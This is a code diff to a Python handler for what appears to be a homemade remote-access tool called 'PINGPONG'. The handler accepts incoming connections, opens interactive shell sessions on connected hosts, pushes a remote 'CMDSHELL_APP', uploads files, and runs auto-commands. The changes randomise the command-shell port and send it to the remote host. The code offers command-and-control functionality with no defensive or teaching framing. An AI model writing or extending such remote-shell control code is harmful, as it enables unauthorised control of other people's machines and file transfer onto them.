@@ -3,14 +3,15 @@
 # @Time      :2022/11/07 21:23:35
 # @Author    :D0WE1L1N
 import os
+import random
 import socket
 import threading
 import sys
 import shutil
 import cmdshell
 import time
-def startserver(ip, port, printf):
-    if printf:
+def startserver(ip, port, printf, open_ac):
+    if printf and False:
         AUTORUNSCRIPT = input("handler>[*]Any AUTORUN COMMAND?(blank for no)>")
     else:
         AUTORUNSCRIPT = " "
@@ -40,10 +41,9 @@ def startserver(ip, port, printf):
         _port = addr[1]
         if printf:
             print('handler>[+]PINGPONG session Created: ' + ip + ":" + str(port) + " >>> " + _ip + ":" + str(_port))
-        t = threading.Thread(target=PINGPONG_shell, args=(conn, addr, _ip, str(_port), True, AUTORUNSCRIPT))
+        t = threading.Thread(target=PINGPONG_shell, args=(conn, addr, _ip, str(_port), True, AUTORUNSCRIPT, open_ac))
         t.start()
-
-def PINGPONG_shell(conn, addr, ip, port, printf, AUTOCOMMAND):
+def PINGPONG_shell(conn, addr, ip, port, printf, AUTOCOMMAND, op_ac):
     def App_send(App, printf):
         if printf:
             print("PINGPONG>[*]Sending application......")
@@ -158,10 +158,11 @@ def PINGPONG_shell(conn, addr, ip, port, printf, AUTOCOMMAND):
             else:
                 return True
     is_Auto = True
-    if AUTOCOMMAND != " " or AUTOCOMMAND != "":
-        is_Auto = False
-    else:
-        is_Auto = True
+    if op_ac:
+        if AUTOCOMMAND == " " or AUTOCOMMAND == "":
+            is_Auto = True
+        else:
+            is_Auto = False
     while True:
         if is_Auto:
             command = input("PINGPONG>")
@@ -172,14 +173,15 @@ def PINGPONG_shell(conn, addr, ip, port, printf, AUTOCOMMAND):
         if command == "cmd" or command == "CMD":
             if App_send("CMDSHELL_APP", True):
                 print("PINGPONG>[+]GOT IT")
-                cmdshell.start(ip, 8625)
+                cmd_port = random.randint(5000, 8000)
+                conn.send(bytes(str(cmd_port), "utf8"))
+                cmdshell.start(ip, cmd_port)
         elif command == "upload" or command == "UPLOAD":
             file_dir = input("PINGPONG>[*]Please input the location of the file in your host>")
             to_dir = input("PINGPONG>[*]Please input the location of the file where you uploaded>")
             Upload(file_dir, to_dir, True, True)
             
         else:
-            print("PINGPONG>[-]Command " + command + " not found")
-                    
+            print("PINGPONG>[-]Command " + command + " not found")                 
 if __name__ == "__main__":
-    startserver("192.168.140.1", "", True)
+    startserver("192.168.140.1", "", True, True)
